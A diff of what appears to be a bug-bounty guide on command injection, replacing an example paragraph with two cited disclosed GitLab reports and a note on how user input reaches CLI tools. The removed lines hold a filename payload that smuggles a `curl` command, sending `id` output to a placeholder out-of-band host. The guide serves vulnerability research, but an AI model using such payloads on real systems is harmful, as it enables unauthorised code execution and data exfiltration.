@@ -48,10 +48,11 @@ CMDi is usually the *endpoint* of a chain (SSRF→internal tool, file-upload→p
 From RCE: read cloud creds / env → infra takeover. See `../../references/chaining.md`.
 
 ## Real paid example
-An image-thumbnail service passed the uploaded filename into a shell `convert` call. A file named
-`x; curl http://OOB/$(id | base64).png` produced a callback carrying the base64 `uid=…` of the
-worker. Blind RCE proven out-of-band, no destructive action. Pre-auth on a public upload form.
-Rough band: $8k–$25k.
+Real disclosed reports:
+- **RCE when removing metadata with ExifTool** (GitLab, $20000) — hackerone.com/reports/1154542 — malicious image/DjVu metadata reached an ExifTool shell context (CVE-2021-22204).
+- **Git flag injection - local file overwrite to remote code execution** (GitLab, $12000) — hackerone.com/reports/658013 — attacker input became a `git` command-line flag (argument injection), no shell metacharacter needed.
+
+**The recurring tell:** user input reaches a CLI invocation — a converter, a metadata stripper, a `git` call — either as a shell string (metacharacters break out) or as a bare argument the binary reads as a flag.
 
 ## Rejected variants
 - `sleep` delta with no OOB and no output on a jittery endpoint — inconclusive, keep hunting.
